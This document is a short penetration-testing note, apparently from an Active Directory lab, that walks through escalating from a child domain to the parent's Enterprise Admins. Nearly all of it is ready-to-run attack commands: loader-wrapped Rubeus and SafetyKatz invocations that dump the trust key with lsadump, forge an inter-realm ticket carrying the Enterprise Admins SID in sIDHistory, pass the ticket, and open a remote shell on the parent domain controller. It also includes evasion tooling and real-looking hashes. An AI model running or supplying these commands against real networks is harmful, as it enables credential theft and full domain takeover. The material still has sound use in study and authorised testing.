**Domain Admin privileges are required for the following**

Ultimate goal is to extract **trust key** from `Child-DC` and forge a inter-realm ticket that has the sIDHistory set to `509` so we can impersonate a `Enterprise Admin` and access resources from the Parent Domain

```powershell
.\Loader.exe -path .\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Extract trust key - '`mcorp$` is the trust account
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"

C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"

C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::lsa /patch"
```

Forge inter-realm TGT
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:f03c20c4974d6f6426f4f3c9b4487549 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

| Option              | Description                                                 |
| ------------------- | ----------------------------------------------------------- |
| silver              | Name of the module                                          |
| /rc4                | NTLM hash of the trust key                                  |
| /sid                | SID of the current domain                                   |
| /sids               | SID of the **enterprise admins** group of the parent domain |
| /ldap               | Retrieve PAC information from the current domain DC         |
| /user:Administrator | Username for which the TGT is generated                     |
| /nowrap             | No newlines in the output                                   |

Use forged inter-realm ticket
```powershell
.\Loader.exe -path .\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>
```

Access Parent Domain DC
```powershell
winrs -r:mcorp-dc.MONEYCORP.LOCAL cmd
```

```powershell

```